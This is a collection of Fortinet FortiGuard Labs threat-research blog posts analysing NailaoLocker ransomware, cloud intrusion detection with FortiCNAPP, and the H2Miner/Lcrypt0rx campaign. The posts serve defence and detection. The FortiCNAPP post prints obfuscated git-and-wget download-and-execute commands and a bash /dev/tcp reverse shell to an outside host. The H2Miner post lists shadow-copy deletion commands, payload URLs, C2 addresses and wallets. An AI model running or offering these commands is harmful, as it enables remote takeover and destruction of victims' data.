[
  {
    "title": "FortiGuard Labs Threat Research",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs analyzes NailaoLocker ransomware, a unique variant using SM2 encryption and a built-in decryption function. Learn how it works, why it matters, and how Fortinet protects against it. ByKuan-Yen LiuandYen-Ting LeeJuly 18, 2025 FortiGuard Labs Threat Research FortiCNAPP Composite Alerts link weak signals into clear timelines—helping security teams detect cloud-native threats earlier and triage them faster. ByDavid AdamsonJuly 17, 2025 FortiGuard Labs Threat Research FortiCNAPP Labs uncovers Lcrypt0rx, a likely AI-generated ransomware variant used in updated H2Miner campaigns targeting cloud resources for Monero mining. ByAkshat PradhanJuly 16, 2025 FortiGuard Labs Threat Research Discover how FortiSandbox 5.0 detects Dark 101 ransomware, even with sandbox evasion tactics. Learn how advanced behavioral analysis blocks file encryption, system tampering, and ransom note deployment. ByBryan LuJuly 14, 2025 FortiGuard Labs Threat Research Explore how AI is changing the cat-and-mouse dynamic of cybersecurity, from cracking obfuscation and legacy languages to challenging new malware built with Flutter, Rust, and Delphi. ByAxelle ApvrilleJuly 10, 2025 FortiGuard Labs Threat Research FortiGuard Labs explores how NordDragonScan utilizes an effective distribution network for dissemination. Learn more. ByCara LinJuly 07, 2025 FortiGuard Labs Threat Research FortiGuard Labs analyzes RondoDox, a stealthy new botnet targeting TBK DVRs and Four-Faith routers via CVE-2024-3721 and CVE-2024-12856. Learn how it evades detection, establishes persistence, and mimics gaming and VPN traffic to launch DDoS attacks. ByVincent LiJuly 03, 2025 FortiGuard Labs Threat Research Threat actor impersonates Colombian government to deliver DCRAT via phishing email, using obfuscation, steganography, and PowerShell payload chains. ByAriel LitvakJuly 01, 2025 FortiGuard Labs Threat Research Explore a detailed technical analysis of a Havoc Remote Access Trojan (RAT) variant used in a targeted cyberattack against Middle East critical national infrastructure. Learn how Fortinet detects and protects against Havoc-based threats. ByXiaopeng ZhangandJohn SimmonsJune 23, 2025 FortiGuard Labs Threat Research FortiGuard Labs has uncovered an ongoing cyberattack, targeting companies in Taiwan using phishing emails disguised as tax-related communications. Read more. ByPei Han LiaoJune 17, 2025 Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research"
  },
  {
    "title": "NailaoLocker Ransomware’s “Cheese”",
    "content": "FortiGuard Labs Threat Research Built-In Decryption or Just Another Trap? Affected Platforms: Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Most files on the compromised machines are encryptedSeverity Level:High FortiGuard Labs recently ran across NailaoLocker, a ransomware variant targeting Microsoft Windows systems. Like many ransomware families, it uses AES-256-CBC to encrypt user files. What sets it apart is the presence of hard-coded SM2 cryptographic keys and a built-in decryption function—an uncommon combination that raises immediate questions about intent. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The name “Nailao,” which means “cheese” in Chinese, may be more than a naming quirk. This ransomware could represent a rare opportunity: a payload with embedded recoverability. Or it could be bait—a trap laid to mislead victims and security researchers. One victim’s solution may, in this case, be another’s cheese. In this blog, we examine NailaoLocker’s complete technical profile, including its execution flow, encryption and decryption routines, and use of SM2 cryptography. We assess whether this variant introduces a genuine threat or exposes an exploitable flaw. NailaoLocker is delivered to the target system as a set of three files: Execution begins when the attacker triggers usysdiag.exe, which loads the malicious sensapi.dll using a DLL side-loading technique. This DLL decrypts and loads the actual ransomware payload (usysdiag.exe.dat) directly into memory. To minimize forensic traces, NailaoLoader frees its own library from memory and deletes sensapi.dll immediately after execution. To prevent multiple instances from running simultaneously, NailaoLocker creates a mutex named lockv7. After loading, NailaoLocker checks a hard-coded value against the string \"XXXX\" to determine which mode to activate: encryption or decryption. This variant does not support command-line arguments for mode selection, indicating that the switch is built-in and may be reserved for internal use or testing. Before execution proceeds, the ransomware performs a series of setup tasks. It launches a console window to display real-time status updates, signaling no intent to conceal its activity. It also creates a log file at %ProgramData%\\lock.log, where it records progress throughout the encryption or decryption process. In encryption mode, the ransomware retrieves the ransom note from its own binary using a simple XOR decoding routine. This note is later dropped into the affected directories. To optimize performance, NailaoLocker uses a multi-threaded architecture coordinated through Windows I/O Completion Ports (IOCP). This design enables high-throughput encryption or decryption across multiple processor cores. An I/O Completion Port is initialized by calling CreateIoCompletionPort(). The main thread performs file system traversal and submits target file handles to the IOCP queue. Meanwhile, each worker thread waits for a handle to appear in the queue. When a file is received, the thread proceeds with encryption or decryption as appropriate. This model decouples file discovery from processing, allowing the ransomware to efficiently scale across available CPU resources. The GetSystemInfo() function is invoked to determine the number of logical processors available on the system. Using this information, the ransomware creates at least eight worker threads to handle concurrent file operations. This guarantees a baseline level of parallelism, even on lower-core systems. In the next section, we examine the two distinct execution modes—encryption and decryption—and provide a detailed analysis of their functionality. A distinctive feature of this NailaoLocker variant is its inclusion of a hard-coded SM2 key pair embedded in ASN.1 DER format. These keys are used during both encryption and decryption. As shown in Figure 1, the embedded key structure contains a public key and a private key. The public key, based on elliptic curve cryptography, includes x and y coordinates that define a point on the SM2 curve. The private key—rarely seen in ransomware samples—is also present, suggesting a potential test build or alternate use case. After extraction, the keys are initialized using the OpenSSL function EVP_PKEY_CTX_new(). Mapping from the hard-coded string “SM2”, the numerical identifier is set to 0x494 and is passed to the encryption function. This is further supported by the presence of the expected curve OID—06 08 2A 81 1C CF 55 01 82 2D—within the ASN.1 structure. When running in encryption mode, NailaoLocker performs two primary tasks: identifying target files and encrypting them using AES-256-CBC. It also appends a ransom note to each affected directory. NailaoLocker begins by enumerating all logical drives on the system. It recursively searches accessible directories for files to encrypt, while deliberately skipping specific system paths and file types to avoid destabilizing the infected host. Excluded file extensions: Excluded directories and files: Once a target file is identified, its handle is pushed to the IO Completion Port queue for processing by a worker thread. A ransom note is also dropped into each of the enumerated directories. Each file sent to the I/O Completion Port is processed by a worker thread, which executes the encryption routine using a unique AES key and IV. At the start of each thread, NailaoLocker allocates memory for 38 _OWORD (16-byte) elements. This space is used to store the AES key, IV, their SM2-encrypted versions, and related metadata. The ransomware uses BCryptGenRandom() to generate a 32-byte AES key and a 16-byte IV for each file: These values are used for file encryption with the AES-256-CBC algorithm. Instead of securing the AES key and IV with RSA, as is common in ransomware, NailaoLocker uses SM2, an elliptic curve cryptographic algorithm. This appears to be the first documented case of SM2 being used to protect symmetric file encryption keys in ransomware. Because SM2 does not produce a fixed-length output, the ransomware stores the sizes of the encrypted AES key and IV in two _WORD fields. The full memory layout includes: For each target file, NailaoLocker appends the .locked extension and sets the file attribute to FILE_ATTRIBUTE_HIDDEN. It then reads up to 0x10000 bytes (64 KB) of data per operation. The ransomware performs encryption using the AES-256-CBC algorithm through OpenSSL’s EVP interface. The process includes: The encrypted data replaces the original content. To facilitate decryption, the ransomware assigns a LARGE_INTEGER (8 bytes) to hold the original file size. This value is stored in thefirst 8 bytesof the encrypted file, allowing the decryptor to navigate to the footer containing key material. After the encrypted payload, the ransomware appends a structured footer. It begins with a 4-byte marker 47 56 37 00 (\"LV7\") to indicate the start of the encryption key section. The original file content was shifted to storing the file size. Also, the encryption padding extends the file size. These bytes are not able to fit in the space before the “LV7” flag and are placed after the encrypted AES key and IV. Following the \"LV7\" marker, NailaoLocker stores all remaining cryptographic and overflow data in a fixed sequence. This layout is color-coded in Figure 15: Once encryption is complete, NailaoLocker restores the file’s original last edit timestamp and renames it with the .locked extension (if not already applied). It then prints the total encryption duration to the console in the format done [time], where [time] represents the duration of the encryption operation. In decryption mode, the ransomware requires the SM2 private key to reconstruct the AES key and IV, which are stored at the end of each encrypted file. It then traverses each directory to find encrypted files and performs the decryption process to restore them to their original status. In this section, we will detail the process and validate the correctness of the built-in ASN.1 DER format of the SM2 private key. To initiate decryption mode, we modify the hard-coded value to be the same as \"XXXX,\" prompting the ransomware to switch modes. Upon switching to decryption mode, the file traversal function is adjusted to search for files with the \".locked\" extension, adding them to the IO Completion Port queue for processing. Again, at least eight threads are created to accelerate the decryption process. Each thread begins by parsing the footer of the encrypted file. The ransomware locates the \"LV7\" marker and reads the data that follows: The SM2 private key, extracted earlier from the embedded ASN.1 DER block, is used to decrypt both the AES key and IV. Once the AES key and IV are recovered, the file content is decrypted using AES-256-CBC via OpenSSL’s EVP interface: Unfortunately, in testing, the embedded SM2 private key failed to correctly decrypt the AES key, suggesting the key material may be incomplete or deliberately non-functional. However, FortiGuard analysts confirmed that when the correct AES key and IV are manually supplied—captured during encryption—the decryption function performs as expected and successfully restores the original file contents. This analysis provides a detailed technical profile of NailaoLocker, a ransomware variant notable for its embedded SM2 key pair and built-in decryption function. Although the embedded SM2 private key is non-functional in practice, testing confirms that the decryption logic operates correctly when supplied with valid AES key material, indicating this may be an in-development strain or internal test build. The use of the Chinese SM2 cryptographic standard, particularly to protect AES file encryption keys, marks a notable divergence from conventional ransomware practices. FortiGuard Labs will continue to monitor for the further adoption of region-specific algorithms and for signs that NailaoLocker is evolving toward active deployment. FortiGuard Labs detects the NailaoLocker ransomware samples with the following AV signatures: FortiEDR,FortiXDR, andFortiDeceptorprovide additional protection by detecting anomalous behavior, halting malicious encryption attempts in real time, and diverting ransomware away from production environments. All protections are continuously updated based on real-time intelligence shared across Fortinet’s global sensor network, partner CERTs, and trusted threat intelligence alliances. Fortinet recommends all organizations maintain a strong ransomware defense posture that includes: If you feel your organizations has been impacted by NailaoLocker or any other ransomware, our globalIncident Responseteam can assist with detection, containment, remediation, and recovery. 1248c4b352b9b1325ef97435bd38b2f02d21e2c6d494a2218ee363d9874b760746f3029fcc7e2a12253c0cc65e5c58b5f1296df1e364878b178027ab26562d6860133376a7c8e051da787187761e596ce9b3d0cfcea21ed8f434992aa7cb8605 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/nailaolocker-ransomware-cheese"
  },
  {
    "title": "Improving Cloud Intrusion Detection and Triage with FortiCNAPP Composite Alerts",
    "content": "FortiGuard Labs Threat Research Detect Cloud Intrusions Faster with Correlated Alerts and Contextual Timelines in FortiCNAPP Moderncyberattacks targeting cloud environmentsare increasingly complex and difficult to detect. Attackers often use multi-stage techniques—such as authentication abuse, privilege escalation, command execution, and interaction withcloud-native APIs—to gain and expand access. Each step in this attack chain often mimics legitimate administrative or developer activity, making it extremely difficult to identify malicious intent. Typical attacker behaviors—such as logging in from a new IP address, accessing previously unused cloud services, or executing command-line processes—can appear indistinguishable from routine actions by developers, admins, or automation. Complicating matters, there is often no single signature, rule, or event that definitively indicates a compromise has occurred. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. As a result, cloud intrusion detection requires examining multiple signals in context. A single weak signal may be inconclusive. But when multiple anomalies involve the same users, resources, or compute nodes over a short period, the likelihood of a targeted intrusion increases significantly. This behavioral correlation is what separates real attacks—or evenpenetration testing—from normal workload activity. FortiCNAPPaddresses this challenge by correlating weak indicators into a coherent picture usingComposite Alertsand theObservation Timeline. The sections below examine how these capabilities work in practice, along with real-world examples that illustrate their value in detecting cloud-native intrusions. To improve detection precision and reduce the burden on security analysts, FortiCNAPP has introduced Composite Alerts. This technology identifies intrusions not by detecting a single event, but by aggregating and correlating multiple indicators associated with the same entity over a defined time window. Each Composite Alert compiles a series of detections, such as suspicious logins, first-time use of administrative APIs, or anomalous container behavior, and links them to specific cloud resources, user identities, or compute instances. Applying a correlation window also allows FortiCNAPP to detect patterns that emerge over minutes or hours rather than the milliseconds of traditional attacks. This approach offers several advantages: As a result, security teams can shift away from reactive alert triage and instead engage in informed, prioritized investigation. By presenting correlated signals with contextual metadata and entity linkage, FortiCNAPP enables analysts to focus their time on evaluating credible threats rather than chasing disconnected anomalies, streamlining the path from detection to resolution. To reduce mean time to triage (MTTT), FortiCNAPP provides each Composite Alert in the form of an Observation Timeline. This timeline serves as both evidence and explanation, enabling the analyst to quickly understand why the alert was generated, which entities were involved, and what sequence of events took place. Each Observation Timeline includes two foundational elements: Once FortiCNAPP has identified a primary entity, such as a compromised IAM user, workload, or compute node, it constructs a timeline by aggregating all related observations for that entity across the alert window. For each observation, the timeline includes: By presenting these elements in a concise, ordered structure, the timeline equips the user to assess the threat in context. This makes it easier to answer key questions, such as: This structured format reduces cognitive load by eliminating the need for analysts to manually reconstruct sequences of activity from disparate logs. It also minimizes investigative overhead by clearly presenting relevant behaviors and their associated metadata in context, enabling faster escalation, more accurate threat classification, and higher-confidence incident response decisions. The first alert involves a machine monitored by a FortiCNAPP agent that was flagged as potentially compromised. Potentially Compromised Host Host machines may have been compromised. The following entities are suspected. Hosts: ip-10-123-45-67 The machine suspected of compromise had the hostname ip-10-123-45-67. Additional host details were available to the end user. The timeline begins on May 13 at 12:00 PM, when FortiCNAPP observed a new vulnerable application installed on the host. Two days later, on May 15 at 10:00 AM, the system launched several new child applications—processes not previously seen originating from this parent process. At 10:36 AM, the timeline flagged a possible reverse shell command. Inspection of the associated command line confirmed it: the host initiated an outbound connection to a remote system, granting that system interactive shell access—even if the machine was behind a firewall or otherwise unreachable from the internet. Further activity that day strengthened the case for compromise. At 12:00 PM, the host contacted a known-bad external domain. At 12:51 PM, it resolved the domain to an internal IP, indicating a successful DNS lookup. By 1:00 PM, it had established an anomalous command-line connection to an external server using wget. This suggests the attacker downloaded and executed malicious code from a remote source. The use of wget with the -qO- flag—which suppresses output and streams the response directly to stdout for execution by a child process—further supports the likelihood of malicious behavior. At this stage, the timeline provides strong evidence of compromise. For further validation, analysts could expand the “+19 more” related entities linked to the “New child application launched” detection. Within this expanded set, multiple command lines reveal obfuscated commands designed to download remote code and execute it locally. This example: /usr/bin/git archive --format=zip --prefix=en --exec=`wget -qO /tmp/QrXErNRt http:// 10.203.118.5:8080/sYdelk;chmod +x /tmp/QrXErNRt;/tmp/QrXErNRt;rm -f /tmp/QrXErNRt` --remote=bOCNVQ/ -- abuses git and wget to download remote code to a file in the tmp directory, execute it, and then clean it up. This example: /usr/bin/git archive --format=zip --prefix=HS --exec=`perl -e 'system(pack(qq,H152,,qq, 62617368202d632027303c263138392d3b65786563203138393c3e2f6465762f7463702f31302e3230332e3131382e352f343434343b7368203c26313839203e2631383920323e2631383927,))'` --remote=dspUKieP/ -- also abuses git, but this time it leverages perl to run an obfuscated script. That obfuscated script, when decoded, is the reverse shell command identified by the syscall detection bash -c 0<&189-;exec 189<>/dev/tcp/ 10.203.118.5/4444;sh <&189 >&189 2>&189 The ability to detect highly obfuscated commands as anomalous and incorporate them into the narrative of a larger suspected attack is a key benefit of FortiCNAPP’s Composite Alerts and of the Observation Timeline feature. This second alert involves AWS identities monitored by FortiCNAPP using CloudTrail logs. Potentially Compromised AWS Keys AWS credentials may have been compromised. The following entities are suspected. Users: AssumedRole/123456789012:AWSReservedSSO_AdministratorAccess_b4a9c2f1837e4d1a; Principal Ids: AROAREDACTEDM9V2Q3LXD:firstname.lastname@redactedcompany.com. In this case, the entity suspected of compromise was the identity AssumedRole/123456789012:AWSReservedSSO_AdministratorAccess_b4a9c2f1837e4d1a, specifically as used by firstname.lastname@redactedcompany.com, as indicated by the principal_id. The timeline began on May 27, when this identity called APIs across 17 AWS regions and 28 different AWS services, suggesting reconnaissance activity. On May 28, the same identity made additional API calls from a previously unseen IP address located outside AWS infrastructure. Over the following two hours, FortiCNAPP observed several additional anomalies associated with this identity, including the use of new services, access to previously used services in new regions, and API calls that resulted in errors. Several of the APIs accessed were sensitive for infrastructure and service discovery. The Lacework customer who received this alert confirmed it as a malicious intrusion. What made this case particularly noteworthy was the absence of an obvious “smoking gun.” Unlike the first example, where reverse shell commands and obfuscated payloads clearly indicated malicious activity, this scenario involved a user behaving anomalously over time in ways that resembled legitimate exploration. The suspicious nature of the behavior became apparent only when the events were viewed in aggregate. FortiCNAPP’s ability to detect this threat did not rely on a single decisive signal. Instead, it resulted from correlating multiple weak signals into a structured timeline. This allowed analysts to determine that a critical mass of suspicious behavior had occurred. This example illustrated the power of Composite Alerts. By aggregating low-signal anomalies that might otherwise be dismissed, FortiCNAPP surfaced a high-fidelity detection—catching the intrusion during the early Discovery phase, before the attacker could escalate privileges or cause damage. Composite Alerts enable security teams to focus on meaningful patterns of behavior that indicate real threats, rather than manually correlating isolated detections. By automatically assembling related signals into a coherent, time-ordered timeline, FortiCNAPP reduces the effort required to identify and respond to cloud-native attacks. Analysts no longer need to reconstruct the narrative from scratch. FortiCNAPP delivers it with supporting evidence and clear entity context. This allows security teams to shift from reactive triage to informed, prioritized investigation. By presenting correlated signals with contextual metadata, FortiCNAPP enables your analysts to focus on credible threats rather than chasing unrelated anomalies. In cloud environments, where attacker dwell times are short and lateral movement can occur quickly, timely and structured detection is essential for containing threats before they escalate into breaches or operational disruptions. FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/improving-cloud-intrusion-detection-and-triage-with-forticnapp"
  },
  {
    "title": "Old Miner, New Tricks",
    "content": "FortiGuard Labs Threat Research H2miner Resurfaces with Lcrypt0rx Ransomware Affected Platforms:Linux, Windows, ContainersImpacted Users:Any OrganizationImpact:Data Encrypted for Impact, Compute Hijacking, Defacement, Sensitive data stolen.Severity Level:Critical The FortiCNAPP team, part of FortiGuard Labs, recently investigated a cluster of virtual private servers (VPS) used for Monero mining. The identified samples are associated withprior H2miner campaignsthat we documented in 2020 and have since been updated with new configurations. H2Miner is a Crypto mining botnet that has been active since late 2019. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. We also identified a new variant of the Lcryx ransomware, calledLcrypt0rx. Lcryx is a relatively new VBScript-based ransomware strain first observed in November 2024. This family exhibits several unusual characteristics that suggest it may have been generated using AI. This is the first documented instance of operational overlap between H2miner and Lcryx, suggesting the following possibilities: The infrastructure hosts a diverse set of samples, including several commercial tools that target multiple operating systems to maximize financial gain from a victim’s environment. Tool Linux Windows Containers KinSing ✔️ Xmrig miners ✔️ ✔️ ✔️ Lcrypt0rx ✔️ Lumma stealer ✔️ DCRat ✔️ Cobalt Strike ✔️ Amadey ✔️ RustyStealer ✔️ ScreenConnect ✔️ The infrastructure uses multiple VPS providers for hosting and Command & Control. 78[.]153[.]140[.]66 HostGlobal plus VPS 80[.]64[.]16[.]241 LIR limited ISP 89[.]208[.]104[.]175 Aeza international VPS 47[.]97[.]113[.]36 Cobalt Strike server hosted by Hangzhou Alibaba Advertising Co. ISP Bitbucket[.]org Used to host payload in repo sadsafsadfsadf/dsfgdsgssdfgdsg 176[.]65[.]137[.]203 Dolphin host VPS. 185[.]156[.]72[.]96 Amadey C2 server hosted by TOV VAIZ PARTNER. ISP 80[.]64[.]18[.]161 Stimul LLC. 207[.]231[.]109[.]252 HostRush VPS. s10[.]krakenfiles[.]com File hosting used for downloading Lcrypt0rx’s wallpaper. This was uploaded on 30-04-2025 104[.]21[.]32[.]1 / softwareshop[.]win Metasploit C2. We suspect the Lcryx family was generated using AI based on the following indicators: We’ve observed growing adoption of large language models (LLMs) by threat actors in recent years. Combined with the widespread availability of commercial tools, this trend has significantly lowered the barrier to entry for cybercriminal activity. In this next section, we will examine some interesting aspects of the identified samples. H2Miner continues to rely heavily on scripts to disable defenses and expand access, ultimately enabling the deployment of miners. Many of these scripts resemble previously documented variants; however, this version has been updated with new deployment URLs. This script includes code blocks that are structurally similar to earlier H2Miner samples used to terminate security software. However, this variant goes further by also targeting database and user application processes. Additionally, it deploysKinsing malware, establishes persistence by registering itself as a service, and attempts to eliminate competing miners by terminating related processes and clearing associated cron entries. The script then checks for an existing cron entry that downloads and executes itself from 80[.]64[.]16[.]241, and adds the entry if it’s missing. Finally, it clears both the current and persistent shell command history to cover its tracks. This script closely resembles earlier H2Miner scripts used to terminate processes and deploy Kinsing malware, but it includes updated URLs. Notably, the script targets theAlibaba Cloud Security Center agentas well as processes andcontainer images running within Docker, indicating an awareness of cloud-specific defenses and containerized environments. This script functions as aKinsing updater. It removes any existing Kinsing installation and redeploys it by downloading and executing a shell script similar in structure to ce.sh. Several additional scripts identified during this investigation reuse code blocks from ce.sh, spr.sh, and cpr.sh. While their specific logic may vary, their ultimate purpose remains consistent: deployingKinsing, a remote access trojan (RAT) commonly used to deliver crypto miners in compromised environments. Name Md5 Description curl-amd64 dbc9125192bd1994cbb764f577ba5dda Kinsing RAT linked to 2021 Log4j (CVE-2021-44228) campaigns kinsing b3039abf2ad5202f4a9363b418002351 Kinsing RAT linked to Openfire (CVE-2023-32315) attacks in 2023. kinsing_aarch64 da753ebcfe793614129fc11890acedbc Kinsing Sample used in Apache ActiveMQ (CVE-2023-46604) attacks in 2023. libsystem.so ccef46c7edf9131ccffc47bd69eb743b Kinsing rootkit observed in the wild in late 2020. This PowerShell script downloads anXMRig Monero minerfrom 78[.]153[.]140[.]66 and saves it to the system’s temporary directory as sysupdate. It then creates a scheduled task using schtasks with the name\"Update service for Windows Service\"to ensure persistence. The script’s structure closely resembles those used in early 2021 mining campaigns and appears to have been reused for current operations. Notably, this XMRig miner is also deployed by theLcrypt0rx ransomwarevariant. The associated configuration file (ff1706b37fea16d75b739a5396d9ffba) points to theMonero wallet:4ASk4RhUyLL7sxE9cPyBiXb82ofekJg2SKiv4MKtCbzwHHLQxVVfVr4D4xhQHyyMTieSM5VUFGR9jZVR5gp6sa1Q2p8SahC This wallet has been previously linked to H2Miner campaigns dating back to late 2021, indicating continuity or overlap in its operator. This usage of older scripts and samples with updated configurations and hosting URLs points to a resurgence of older campaigns from2020and2021. Analysis of this sample shows that it follows the following step-by-step process: Lcrypt0rx first checks if it is running with administrator privileges. If not, it relaunches itself with elevated rights using Shell.Application to invoke wscript.exe with the /elevated flag. Once elevated, the script disables a range of system utilities and user protections by modifying the Windows Registry. These include: It also disables the execution of several critical tools: Lcrypt0rx then attempts to establish persistence by adding its full path to theWinlogon Shellregistry key and registering itself as anImage File Execution Options (IFEO)debugger for cmd.exe. However, these attempts fail because the script path is addedwithout prependingwscript.exe, rendering the entries non-functional. Using WMI, the script then forcibly terminates taskmgr.exe, msconfig.exe, and regedit.exe. It also modifies theScancode Mapregistry to disable a wide range of keys, including: Mouse buttons are reversed, and all changes are applied immediately to disrupt user control. From (Hex) From (Key) To (Hex) To (Key) Notes E05B Left Windows 0000 Disabled Disable Left Win E05C Right Windows 0000 Disabled Disable Right Win 001D Left Ctrl 0000 Disabled Disable Left Ctrl E01D Right Ctrl 0000 Disabled Disable Right Ctrl 002A Left Shift 0000 Disabled Disable Left Shift 0036 Right Shift 0000 Disabled Disable Right Shift 0038 Left Alt 0000 Disabled Disable Left Alt E038 Right Alt (AltGr) 0000 Disabled Disable Right Alt 003B F1 0000 Disabled Disable F1 E053 Delete (Ext) 0000 Disabled Disable Delete E000 Null? (invalid) 0000 Disabled Malformed entry? 003C F2 0000 Disabled Disable F2 003D F3 0000 Disabled Disable F3 002E C 0000 Disabled Disable C 0032 M 0000 Disabled Disable M 0020 D 0000 Disabled Disable D 0014 T 0000 Disabled Disable T 001E A 0000 Disabled Disable A 001F S 0000 Disabled Disable S 0025 K 0000 Disabled Disable K 0031 N 0000 Disabled Disable N 0022 G 0000 Disabled Disable G 0012 E 0000 Disabled Disable E 0013 R 0000 Disabled Disable R 0017 I 0000 Disabled Disable I 0044 F10 0000 Disabled Disable F10 Next, the script marks itself asread-only,hidden, andsystem-protected, and proceeds to overwrite theMaster Boot Record (MBR)—a destructive move that renders the system unbootable. Lcrypt0rx then attempts to disable Windows Defender real-time protection, BitDefender, and Kaspersky. However, the methods used for BitDefender and Kaspersky are ineffective—likely artifacts of LLM hallucinations. The firewall is disabled via netsh. An 8,192-character master key is then generated using ASCII values 1–255, and a per-file salt of equal length is appended to it during the encryption process. This key-salt pair is used to XOR-encode each file’s content. Folders selected for encryption include standard directories and OneDrive backups. System recovery is disrupted by: cmd.exe /c vssadmin delete shadows /all /quietcmd.exe /c wbadmin delete catalog -quiet Next, a ransom note is dropped in multiple locations (Desktop, Documents, Pictures, Videos, Downloads, Music) and opened in Notepad. The message demands$1,000(up from $500 in earlier samples) and shortens the payment deadline from 5 to 3 days. The .onion URL in the note is syntactically incorrect and doesn't match the one shown in the desktop wallpaper, which uses an obsolete V2 TOR address, suggesting a placeholder or reuse by H2Miner actors. An image from https://s10[.]krakenfiles[.]com/uploads/30-04-2025/605q6HLKTv/image[.]jpg is then downloaded and set as the desktop background by editing the HKCU\\Control Panel\\Desktop\\Wallpaper registry key. The TOR address in the image aligns with older Lcryx variants. Lcrypt0rx then establishes fallback persistence by dropping and registering multiple embedded scripts via run keys. This time, persistence works correctly, with the scripts executed using wscript.exe and marked as read-only, system-protected, and hidden. A summary of the scripts is listed below: Full path Description C:\\Windows\\SysWOW64\\msvcr80.dll.bat Ping’s ragebot[.]fun, a game cheat developer site. C:\\Windows\\System32\\systemconfig.exe.vbs Denial-of-Service script that floods the system's network interface’s gateway and ragebot[.]fun with 45 MB HTTP POSTs. C:\\Windows\\advapi32_ext.vbs Uses taskkill to kill targeted processes, including popular AV processes like Avast, Windows Defender, Kaspersky, AVG, Norton, Protegent360, AvGuard, McAfee McShield, etc., in an infinite loop. C:\\Windows\\System32\\USB_bridge.vbs Monitors for any newly connected drive and then copies itself over. Likely a prototype script. C:\\Windows\\CDConnector.vbs Monitors for any connected CD drive and attempts to eject it. C:\\Windows\\System32\\slmgr.bat.vbs Launches itself with the windows hidden and continuously displays a message box demanding ransom payments. It also resets the system time to 00:00, likely in an attempt to confuse system logs. The script then modifies the hosts file to block AV-related domains and disables cmd.exe for the current user by setting: HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\DisableCMD Lcrypt0rx then downloads and executes miners and infostealers before finally entering the encryption routine.This section is not seen in older Lcryx samples. The details about the executables are listed below. URL MD5 Description http://89[.]208[.]104[.]175:5002/ime3[.]exe 9e4f149dae1891f1d22a2cea4f68432e A Trojan with fake Google resources that is primarily used for disabling defences and Monero mining. It modifies the hosts file to block popular AV sites, adds defender whitelisting via PowerShell, removes the MSRT update via wusa.exe, disables Windows updates via sc.exe, creates a service persistence for itself, and escalates privileges via BYOVD technique for the vulnerable driver WinRing0.sys http://89[.]208[.]104[.]175:5002/piperpate[.]exe a729410de4dc397d1fb2ab8f7ae560d3 Lumma stealer. C2s: disciplipna[.]top/eqwu, praetori[.]live/vepr, opusculy[.]top/keaj, scriptao[.]digital/vpep, civitasu[.]run/werrp\", , exitiumt[.]digital/xane, viriatoe[.]live/laopx, brandihx[.]run/lowp, triremeo[.]digital/akds https://bitbucket[.]org/sadsafsadfsadf/dsfgdsgssdfgdsg/downloads/MicrosoftSoftware[.]exe 2726145d4ef3b34d3c3a566177805c39 Injector that checks for debugger and then injects DCRat. http://47[.]97[.]113[.]36:10010/02[.]08[.]2022[.]exe 1aee8a425ea53c571a16b8efde05ba01 Cobalt Strike C2 : 47[.]97[.]113[.]36 http://176[.]65[.]137[.]203/music-play[.]exe B6cd214bb814362694cc48299ebaf0e5 A Trojan that drops .bat files that execute xmrig miners from temp. The IP range also hosts a Metasploit reverse shell for Windows and Linux with C2 callbacks to 176[.]65[.]138[.]172 & softwareshop[.]win. The range also hosts web shells. http://185[.]156[.]72[.]121/test/exe/random[.]exe 0680df49e1866c86697028ea73d28d28 Amadey Infostealer. C2s: 185[.]156[.]72[.]96/te4h2nus/index.php mutex: 006700e5a2ab05704bbb0c589b88924d\" encryption_key: NGEyYjFkNzk0ZTc5YTQ1MzJiNmUyYjY3OTQwOGQyYmI= http://80[.]64[.]18[.]161/files/6051142952/8QivM1I[.]exe d3884cc519c6855ae20d64264d5f6e93 RustyStealer. It also executes multiple PowerShell commands that add folder exclusion for users\\<username> and appdata\\local\\packages to defender, creates runonce and scheduled task persistence for itself. These scripts have minor syntactical errors. http://78[.]153[.]140[.]66/xmrig[.]exe 57f0fdec4d919db0bd4576dc84aec752 Same Xmrig miner that was downloaded by H2miner script 1.ps1  6868c280c61c0b1e2ab8bf6792f1eef2 https://207[.]231[.]109[.]252/bin/support[.]client[.]exe 44143827116c96f5dcace4f95dff8697 ConnectWise ScreenConnect. The config used for Monero mining points to the following wallets for mining payouts: Lcrypt0rx now enters a persistent loop that continuously scans the previously enumerated directories and any attached storage volumes for new files to encrypt. Each file is processed through an encryption routine with multiple checks and conditions. The routine begins by attempting to open the file using the OpenTextFile method in VBScript. This fails for executables, DLLs, and other system-critical formats, which are excluded by default through error handling. Before proceeding, the script verifies whether the file: Files that fail these checks are queued for encryption. To encrypt each file, Lcrypt0rx generates a unique8,192-character saltcomposed of ASCII characters (codes 1–255), which it appends to a pre-generated master key. This is a notable change from earlier Lcryx variants, where the salt length was only 32 characters. The script then XORs each character of the file content with the corresponding character from the combined key-salt pair, producing the obfuscated output. The resulting data is saved to a new file with the .lcryx extension, and the original file is deleted to complete the encryption process. As a final step, Lcrypt0rx checks all targeted folders for files associated with backups. Any files with recognized backup-related extensions are deleted to further prevent recovery. Despite these actions, the ransomware does not transmit or store the encryption keys locally or remotely. Combined with the use of simple XOR encryption, this makes recovery trivial through basic cryptanalysis. The lack of key management, combined with the presence of scare tactics and superficial ransom demands, suggests that Lcrypt0rx operates more asscarewarethan a serious ransomware threat. The H2Miner threat actors have remained active and adaptable since first emerging in late 2019. Their recent campaigns continue to rely on a blend of reused, proven tooling and newly integrated elements, including the curious addition of Lcrypt0rx ransomware. While Lcrypt0rx lacks the sophistication of more advanced ransomware families, it introduces distinct techniques for degrading system usability, UI interference, and redundant embedded scripts. It also bundles commercially available hack tools and infostealers, expanding its functionality beyond simple encryption. Ultimately, both the H2Miner and Lcrypt0rx chains converge on the deployment of Monero miners, a hallmark of resource hijacking campaigns. 